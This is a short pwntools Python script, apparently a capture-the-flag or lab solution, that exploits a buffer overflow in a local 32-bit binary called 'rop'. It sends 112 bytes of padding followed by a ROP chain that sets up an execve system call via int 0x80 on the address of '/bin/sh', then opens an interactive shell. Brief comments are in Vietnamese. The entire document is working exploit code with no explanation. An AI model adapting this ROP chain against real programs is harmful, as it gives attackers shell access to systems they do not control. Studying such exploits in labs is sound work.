from pwn import *

p = process('./rop')

pop_eax_ret = 0x080bb196 #pop eax; ret
pop_edx_ecx_ebx_ret = 0x0806eb90
int_0x80 = 0x08049421
binsh = 0x80be408

payload = b'a'*112
payload += p32(pop_eax_ret)
payload += p32(0xb)
payload += p32(pop_edx_ecx_ebx_ret)
payload += p32(0) #gán cho edx
payload += p32(0) #gán cho ecx
payload += p32(binsh) #gán cho ebx
payload += p32(int_0x80)

print("This is the payload: ",payload)

p.sendline(payload)
p.interactive()